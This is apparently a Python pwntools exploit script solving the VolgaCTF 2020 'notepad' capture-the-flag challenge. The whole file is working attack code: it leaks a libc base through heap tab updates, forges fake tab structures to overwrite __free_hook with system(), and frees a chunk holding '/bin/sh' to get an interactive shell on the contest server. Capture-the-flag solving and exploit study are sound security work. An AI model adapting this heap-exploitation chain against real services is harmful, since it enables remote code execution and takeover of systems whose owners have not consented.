#!/usr/bin/python
from pwn import *

HOST = 'notepad.q.2020.volgactf.ru'
PORT = 45678
chdir = '/MOUNT/contest/volgaCTF-2020/notepad/'
config = {
        'elf': chdir + 'notepad',
        'libc': '/lib/x86_64-linux-gnu/libc-2.27.so',
        'HOST': 'notepad.q.2020.volgactf.ru',
        'PORT': PORT,
        }

def add_note(r, name):
    r.sendlineafter('>','a')
    r.sendlineafter('Enter notebook name:',name)

def pick_note(r, idx):
    r.sendlineafter('>','p')
    r.sendlineafter('Enter index of a notebook to pick:',str(idx))

def add_tab(r, name, data_len, data):
    r.sendlineafter('>','a')
    r.sendlineafter('Enter tab name:',name)
    r.sendlineafter('Enter data length (in bytes):',str(data_len))
    r.sendafter('Enter the data:',data)

def view_tab(r, idx):
    r.sendlineafter('>','v')
    r.sendlineafter('Enter index of a tab to view:',str(idx))

def update_tab(r, idx, name, data_len, data):
    r.sendlineafter('>','u')
    r.sendlineafter('Enter index of tab to update:',str(idx))
    if not name:
        r.sendafter('Enter new tab name (leave empty to skip):','\n')
        r.sendafter('Enter new data length (leave empty to keep the same):','\n')
    else:
        r.sendlineafter('Enter new tab name (leave empty to skip):',name)
        r.sendlineafter('Enter new data length (leave empty to keep the same):',str(data_len))
    r.sendafter('Enter the data:',data)

def delete_tab(r, idx):
    r.sendlineafter('>','d')
    r.sendlineafter('Enter index of tab to delete:',str(idx))

def exploit(r):
    # Memory Leak
    add_note(r,'ke2ek')
    pick_note(r,1)
    add_tab(r,'A',0x4f0,'A'*0x4f0)
    add_tab(r,'B',0x30,'B'*0x30)
    update_tab(r,1,'C',0x20,'C'*8)
    view_tab(r,1)
    r.recvuntil('C'*8)
    leak = u64(r.recvn(6).ljust(8, '\x00'))
    libc.address = leak - 0x3ec0d0
    log.info("leak addr: {:#x}".format(leak))
    log.info("libc base: {:#x}".format(libc.address))
    r.sendlineafter('>','q')

    # Get Shell
    fake_tabs = 'A'*16 + p64(0x41)
    fake_tabs += p64(libc.symbols['__free_hook'])
    fake_tabs += 'A'*16 + p64(0x41)
    fake_tabs += p64(libc.search('/bin/sh').next())
    add_note(r,'A'*16 + p64(0x2) + fake_tabs)
    pick_note(r,2)
    update_tab(r,1,None,0,p64(libc.symbols['system']))
    delete_tab(r,2)

    pause()
    r.interactive()
    

if __name__ == '__main__':
    if "elf" in config.keys() and config["elf"]:
        e = ELF(config["elf"])
    if "libc" in config.keys() and config["libc"]:
        libc = ELF(config["libc"])

    context.log_level = 'debug'

    if len(sys.argv) > 1:
        r = remote(config["HOST"], config["PORT"])
    else:
        context.terminal=['tmux', 'splitw', '-h']
        r = process(e.path)
        gdb.attach(r, gdbscript=''' b *0x16fe; b *0x1294; b *0xba2; b *0xbbe; ''')
    exploit(r)

